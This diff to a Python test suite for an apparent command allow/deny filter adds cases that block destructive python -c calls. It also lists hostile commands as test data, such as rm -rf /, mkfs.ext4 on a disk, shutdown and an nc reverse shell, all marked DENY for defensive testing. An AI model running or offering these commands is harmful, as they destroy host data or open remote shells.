@@ -99,6 +99,11 @@ def test_workspace_edit_refuses_missing_or_ambiguous(tmp_path: Path) -> None:
         ('git commit -m "cleanup rm -rf old files"', Verdict.ALLOW),
         ("cat mkfs.md", Verdict.ALLOW),  # a filename, not the mkfs program
         ('bash -c "rm -rf /"', Verdict.DENY),  # but a shell -c inner IS still caught
+        # python is allowlisted, but a destructive LIBRARY call in -c must not slip past
+        # the shell-oriented rules (it would delete host files inline).
+        ("python -c \"import shutil; shutil.rmtree('/')\"", Verdict.DENY),
+        ("python3 -c \"import os; os.removedirs('/var')\"", Verdict.DENY),
+        ("python -c \"print(shutil.which('ls'))\"", Verdict.ALLOW),  # mentions shutil, not rmtree
         ('bash -c "mkfs.ext4 /dev/sda"', Verdict.DENY),  # -c inner at a command position
         ('bash -c "shutdown now"', Verdict.DENY),
         ("nc host 4444 -e /bin/sh", Verdict.DENY),  # reverse shell, -e after host/port
